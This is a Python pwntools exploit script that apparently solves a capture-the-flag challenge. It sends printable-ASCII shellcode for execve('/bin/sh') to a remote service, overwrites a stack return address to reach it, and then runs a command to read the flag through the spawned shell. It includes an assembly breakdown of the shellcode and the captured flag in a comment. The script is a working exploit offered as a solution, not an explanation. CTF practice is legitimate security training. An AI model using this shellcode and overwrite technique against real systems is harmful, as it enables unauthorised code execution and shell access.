#!/usr/bin/env python
from pwn import *

# AD{Beaut1fu1_she11c0d3_~~~~~~~}

host , port = 'ctf.yuawn.idv.tw' , 10110
y = remote( host , port )

'''
\\  = pop rsp
P   = push rax
j;  = push 0x3b
X   = pop rax
T   = push rsp
_   = pop rdi
4;  = xor al, 0x3b
^   = pop rsi
Z   = pop rdx
Y   = pop rcx
'''

'''
    push 0x3b
    pop rax
    xor al, 0x3b
    push rax
    push rax
    pop rsi
    pop rdx

    push 0x3b395a3b
    pop rax
    xor rax, 0x3b594b3b
    push rax
    pop rsp

    push 0x3b3b3e34
    pop rax
    xor rax, 0x3b3b3b3b
    push rax

    pop rcx
    pop rcx
    pop rcx
    push rsp
    pop rdi

    push 0x3b
    pop rax
'''

name = 0x6010c0 # 0x601100 = 0x3b395a3b ^ 0x3b594b3b

sc = 'j;X4;PP^Zh;Z9;XH5;KY;P\\h4>;;XH5;;;;PYYYT_j;X'
sc = sc + 'Y' * ( 0x50 - len( sc ) ) + '/bin/sh'

print len( sc )

y.sendafter( ']:' , sc )

sleep(1)

y.send( 'D' * 0x10 + p64( 0 ) + p64( name ) )

sleep(1)

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()